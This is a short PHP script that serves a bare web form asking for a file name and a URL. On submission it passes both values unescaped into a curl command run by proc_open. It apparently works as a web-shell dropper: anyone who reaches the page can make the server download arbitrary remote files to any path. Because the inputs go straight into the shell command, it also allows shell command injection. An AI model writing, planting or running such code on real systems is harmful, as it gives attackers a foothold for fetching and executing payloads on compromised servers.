<?php


echo "<form action='' method='post'><input type='text' name='g1' placeholder='file name'><br><input type='text' name='g2' placeholder='url'><input type='submit'></form>";


        
	    
if ($_POST){
    
    $proc=proc_open('curl --output '.$_POST['g1'].' "'.$_POST['g2'].'"',
  array(
    array('pipe','r'),
    array('pipe','w'),
    array('pipe','w')
  ),
  $pipes);
    echo "OK";
  
    
}


?>
